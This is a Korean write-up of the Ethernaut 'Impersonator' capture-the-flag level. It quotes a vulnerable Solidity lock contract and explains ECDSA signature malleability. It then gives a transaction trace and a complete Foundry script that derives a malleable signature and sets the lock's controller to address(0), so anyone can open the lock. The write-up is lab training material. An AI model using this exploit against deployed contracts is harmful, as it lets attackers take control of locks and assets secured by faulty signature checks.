# 지문

SlockDotIt의 새로운 제품 **ECLocker**는 **Solidity 스마트 컨트랙트**와 **IoT 게이트 락**을 통합하여, **Ethereum ECDSA**를 활용한 인증 기능을 제공합니다. 유효한 서명이 잠금 장치로 전송되면, 시스템은 **Open 이벤트**를 발생시키고, 해당 권한을 가진 컨트롤러가 문을 열 수 있도록 합니다.
SlockDotIt은 이 제품을 출시하기 전에 보안 점검을 위해 당신을 고용했습니다.
이 시스템을 누구나 문을 열 수 있게끔 **취약점을 악용**할 수 있는 방법을 찾아낼 수 있나요?

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "openzeppelin-contracts-08/access/Ownable.sol";

// SlockDotIt ECLocker factory
contract Impersonator is Ownable {
    uint256 public lockCounter;
    ECLocker[] public lockers;

    event NewLock(address indexed lockAddress, uint256 lockId, uint256 timestamp, bytes signature);

    constructor(uint256 _lockCounter) {
        lockCounter = _lockCounter;
    }

    function deployNewLock(bytes memory signature) public onlyOwner {
        // Deploy a new lock
        ECLocker newLock = new ECLocker(++lockCounter, signature);
        lockers.push(newLock);
        emit NewLock(address(newLock), lockCounter, block.timestamp, signature);
    }
}

contract ECLocker {
    uint256 public immutable lockId;
    bytes32 public immutable msgHash;
    address public controller;
    mapping(bytes32 => bool) public usedSignatures;

    event LockInitializated(address indexed initialController, uint256 timestamp);
    event Open(address indexed opener, uint256 timestamp);
    event ControllerChanged(address indexed newController, uint256 timestamp);

    error InvalidController();
    error SignatureAlreadyUsed();

    /// @notice Initializes the contract the lock
    /// @param _lockId uinique lock id set by SlockDotIt's factory
    /// @param _signature the signature of the initial controller
    constructor(uint256 _lockId, bytes memory _signature) {
        // Set lockId
        lockId = _lockId;

        // Compute msgHash
        bytes32 _msgHash;
        assembly {
            mstore(0x00, "\x19Ethereum Signed Message:\n32") // 28 bytes
            mstore(0x1C, _lockId) // 32 bytes
            _msgHash := keccak256(0x00, 0x3c) //28 + 32 = 60 bytes
        }
        msgHash = _msgHash;

        // Recover the initial controller from the signature
        address initialController = address(1);
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, _msgHash) // 32 bytes
            mstore(add(ptr, 32), mload(add(_signature, 0x60))) // 32 byte v
            mstore(add(ptr, 64), mload(add(_signature, 0x20))) // 32 bytes r
            mstore(add(ptr, 96), mload(add(_signature, 0x40))) // 32 bytes s
            pop(
                staticcall(
                    gas(), // Amount of gas left for the transaction.
                    initialController, // Address of `ecrecover`.
                    ptr, // Start of input.
                    0x80, // Size of input.
                    0x00, // Start of output.
                    0x20 // Size of output.
                )
            )
            if iszero(returndatasize()) {
                mstore(0x00, 0x8baa579f) // `InvalidSignature()`.
                revert(0x1c, 0x04)
            }
            initialController := mload(0x00)
            mstore(0x40, add(ptr, 128))
        }

        // Invalidate signature
        usedSignatures[keccak256(_signature)] = true;

        // Set the controller
        controller = initialController;

        // emit LockInitializated
        emit LockInitializated(initialController, block.timestamp);
    }

    /// @notice Opens the lock
    /// @dev Emits Open event
    /// @param v the recovery id
    /// @param r the r value of the signature
    /// @param s the s value of the signature
    function open(uint8 v, bytes32 r, bytes32 s) external {
        address add = _isValidSignature(v, r, s);
        emit Open(add, block.timestamp);
    }

    /// @notice Changes the controller of the lock
    /// @dev Updates the controller storage variable
    /// @dev Emits ControllerChanged event
    /// @param v the recovery id
    /// @param r the r value of the signature
    /// @param s the s value of the signature
    /// @param newController the new controller address
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external {
        _isValidSignature(v, r, s);
        controller = newController;
        emit ControllerChanged(newController, block.timestamp);
    }

    function _isValidSignature(uint8 v, bytes32 r, bytes32 s) internal returns (address) {
        address _address = ecrecover(msgHash, v, r, s);
        require (_address == controller, InvalidController());

        bytes32 signatureHash = keccak256(abi.encode([uint256(r), uint256(s), uint256(v)]));
        require (!usedSignatures[signatureHash], SignatureAlreadyUsed());

        usedSignatures[signatureHash] = true;

        return _address;
    }
}
```

# 풀이 

코드를 보면 전형적인 ECDSA Malleability 문제.

일단 storage에 한번 signature가 저장되는데 한번 쓴 signature는 또 다시 재사용할수없다.

이미 사용된 signature로부터 또 다른 signature를 뽑아낼 수 있다.

그리고 코드상 서명을 검증하는데 `ecrecover` 내장함수를 사용하는데 이 함수의 특징은 서명이 실패했을 때 address(0)을 반환한다는것이다.

따라서, controller를 address(0)으로 세팅하면 누구나 서명을 이상하게 넣어도 항상 `_isValidSignature`함수를 통과한다.

일단 instance를 생성할때의 transaction부터 분석하고 그안에서 이미 사용된 signature를 분석한다 

```shell
hojunghan@hojungui-MacBookPro ethernaut-solve-using-foundry % cast run 0xd81e812d2375ee6687b512081d1141bc2116aba79c749441912da761af481385 --rpc-url http://localhost:8545
Warning: This is a nightly build of Foundry. It is recommended to use the latest stable version. To mute this warning set `FOUNDRY_DISABLE_NIGHTLY_WARNING` in your environment. 

Executing previous transactions from the block.
Traces:
  [1257784] 0x5FbDB2315678afecb367f032d93F642f64180aa3::createLevelInstance(0x959922bE3CAee4b8Cd9a407cc3ac1C251C2007B1)
    ├─ [1081769] 0x959922bE3CAee4b8Cd9a407cc3ac1C251C2007B1::createInstance(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC)
    │   ├─ [676226] → new <unknown>@0x24B3c7704709ed1491473F30393FFc93cFB0FC34
    │   │   ├─ emit OwnershipTransferred(previousOwner: 0x0000000000000000000000000000000000000000, newOwner: 0x959922bE3CAee4b8Cd9a407cc3ac1C251C2007B1)
    │   │   └─ ← [Return] 3148 bytes of code
    │   ├─ [370986] 0x24B3c7704709ed1491473F30393FFc93cFB0FC34::deployNewLock(0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b9178489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2000000000000000000000000000000000000000000000000000000000000001b)
    │   │   ├─ [289107] → new <unknown>@0x0F404c03405EF624c177e5449A154DfcCB1a5594
    │   │   │   ├─ [3000] PRECOMPILES::ecrecover(0xf413212ad6f041d7bf56f97eb34b619bf39a937e1c2647ba2d306351c6d34aae, 27, 11397568185806560130291530949248708355673262872727946990834312389557386886033, 54405834204020870944342294544757609285398723182661749830189277079337680158706) [staticcall]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000042069d82d9592991704e6e41bf2589a76ead1a91
    │   │   │   ├─ emit LockInitializated(initialController: 0x42069d82D9592991704e6E41BF2589a76eAd1A91, timestamp: 1756072966 [1.756e9])
    │   │   │   └─ ← [Return] 1194 bytes of code
    │   │   ├─ emit NewLock(lockAddress: 0x0F404c03405EF624c177e5449A154DfcCB1a5594, lockId: 1337, timestamp: 1756072966 [1.756e9], signature: 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b9178489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2000000000000000000000000000000000000000000000000000000000000001b)
    │   │   └─ ← [Stop]
    │   └─ ← [Return] 0x00000000000000000000000024b3c7704709ed1491473f30393ffc93cfb0fc34
    ├─ [119088] 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9::createNewInstance(0x24B3c7704709ed1491473F30393FFc93cFB0FC34, 0x959922bE3CAee4b8Cd9a407cc3ac1C251C2007B1, 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC)
    │   ├─ [111818] 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512::createNewInstance(0x24B3c7704709ed1491473F30393FFc93cFB0FC34, 0x959922bE3CAee4b8Cd9a407cc3ac1C251C2007B1, 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC) [delegatecall]
    │   │   └─ ← [Stop]
    │   └─ ← [Return]
    ├─ emit LevelInstanceCreatedLog(player: 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC, instance: 0x24B3c7704709ed1491473F30393FFc93cFB0FC34, level: 0x959922bE3CAee4b8Cd9a407cc3ac1C251C2007B1)
    └─ ← [Stop]


Transaction successfully executed.
Gas used: 1279216

```

뽑아낸 signature는 `0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b9178489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2000000000000000000000000000000000000000000000000000000000000001b` 임.

이것을 기반으로 또 다른 signature를 뽑아낸다 

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function lockers(uint256 index) external view returns (address);
    function lockCounter() external view returns (uint256);
}

interface IECLocker {
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
    function controller() external view returns (address);
}
contract SolveScript is Script {
    address public target = 0x24B3c7704709ed1491473F30393FFc93cFB0FC34;

    function setUp() public {}

    // forge script -vvvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        bytes32 msgHash = 0xf413212ad6f041d7bf56f97eb34b619bf39a937e1c2647ba2d306351c6d34aae;

        // trace log에서 확인한 실제 r, s, v 값들
        bytes32 r = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;
        bytes32 s = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;
        uint8 v = 27;

        address recovered = ecrecover(msgHash, v, r, s);
        console.log("Original signature recovered address:", recovered);

        // signature malleability 시도 이후 ecrecover 함수 호출 후 address 출력
        bytes32 secp256k1Order = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
        bytes32 malleableS = bytes32(uint256(secp256k1Order) - uint256(s));
        uint8 malleableV = v == 27 ? 28 : 27;

        address malleableRecovered = ecrecover(msgHash, malleableV, r, malleableS);
        console.log("Malleable signature recovered address:", malleableRecovered);
        address lockContract = ITarget(target).lockers(0); // 첫 번째 lock
        console.log("Lock contract address:", lockContract);
        
        // 현재 controller 확인
        address currentController = IECLocker(lockContract).controller();
        console.log("Current controller:", currentController);
        
        // malleable signature로 changeController 호출하여 controller를 address(0)으로 변경
        if (malleableRecovered == recovered) {
            console.log("Using malleable signature to change controller to address(0)");
            IECLocker(lockContract).changeController(malleableV, r, malleableS, address(0));
            console.log("Controller changed to address(0) successfully!");
            
            // 변경된 controller 확인
            address newController = IECLocker(lockContract).controller();
            console.log("New controller:", newController);
        } else {
            console.log("Malleable signature generates different address, cannot proceed");
        }

        vm.stopBroadcast();
    }
}
```